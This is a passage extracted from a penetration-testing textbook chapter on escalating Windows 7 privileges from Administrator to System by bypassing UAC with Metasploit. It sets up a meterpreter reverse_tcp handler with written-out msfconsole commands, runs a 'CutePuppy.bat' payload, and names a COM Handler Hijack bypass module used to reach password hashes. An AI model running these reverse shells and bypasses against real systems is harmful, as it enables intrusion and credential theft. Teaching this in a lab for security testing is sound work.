  md: '# # Chapter 12

    # Windows Privilege Escalation by Bypassing UAC


    The Administrator account in Windows has a lot of authority, but there are some
    things that even an Administrator cannot do. For some functions you have to be
    the "System" user to have complete control.  User Access Control (UAC) can also
    block access to what the security tester wants to accomplish, including running
    System level tasks. UAC seemed to be a nuisance in older Windows version, and
    many companies just turned it off. UAC works very well in Windows 7 on up and
    using it on even the lowest security setting prevents attacks that worked in Windows
    XP.


    For example, even if we get a remote Administrator level session in Metasploit,
    UAC will prevent us from doing some things like obtaining password hashes. There
    are UAC bypass modules in Meterpreter that will allow us to bypass this restriction
    and get System level access - That is if the user account we compromise is an
    Administrator. In this section we will learn how to escalate our privileges from
    an Administrator level user to System level by bypassing UAC.


    In this chapter we will start with an active Meterpreter session with a Windows
    7 system and a user that has Administrator level rights. For simplicity, we will
    use the session created in the last chapter. We will then use the UAV bypass to
    upgrade our Administrator level user to a System level account. Next, we will
    cover the "Recovery_Files" Metasploit module. This module requires system level
    access to run and allows us to recover deleted files from the remote system. Lastly,
    a second module to bypass UAC is briefly covered.


    # ## Bypass UAC Module


    Several tools in Metasploit need system level access to function correctly. The
    problem is that the UAC security feature of Windows blocks attempts at running
    programs at an elevated security level. The Bypass UAC module in Metasploit takes
    a remote session with a user that has Administrator privileges and creates'
  merge: -1
  pgno: 171
- img_proc: false
  md: 'a new session that can be elevated to System level with the "*getsystem*" command.


    You can use the "CutePuppy" attack from the previous chapter. It is a good idea
    though to reboot the Windows 7 VM, exit Metasploit and restart it, so the attack
    works right. If you don''t do this you may end up getting multiple sessions in
    Metasploit from the Windows 7 system!


    +   1. Run Metasploit and start the multi-handler.


    ```

    msf > use multi/handler

    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

    payload => windows/meterpreter/reverse_tcp

    msf exploit(multi/handler) > set LHOST 192.168.1.39

    LHOST => 192.168.1.39

    msf exploit(multi/handler) > set LPORT 4444

    LPORT => 4444

    msf exploit(multi/handler) > exploit


    [*] Started reverse TCP handler on 192.168.1.39:4444

    ```


    +   2. Double click on the "CutePuppy.bat" file on your Windows 7 system.

    3. Type "*background*" if you are sitting at the Meterpreter prompt.

    4. Type "**sessions**" to view your active session.


    As seen in the screenshot below:


    ![](bbox=[0.142, 0.563, 0.858, 0.814])


    There are several modules to Bypass UAC in Metasploit. As Windows Security advances
    and changes, you will notice that ones that worked fine at one-point, no longer
    work, and you need to run a different one. This is just a normal part of the "cat
    and mouse" game that is part of security testing. An exploit works, it is patched
    against, a new exploit is created, etc. We will cover one Bypass UAC module now;
    a second module is covered at the end of the chapter.


    At the time of this writing the "Windows Escalate UAC Protection Bypass (Via COM
    Handler Hijack)" module worked well against the Windows 7 system. It is a'
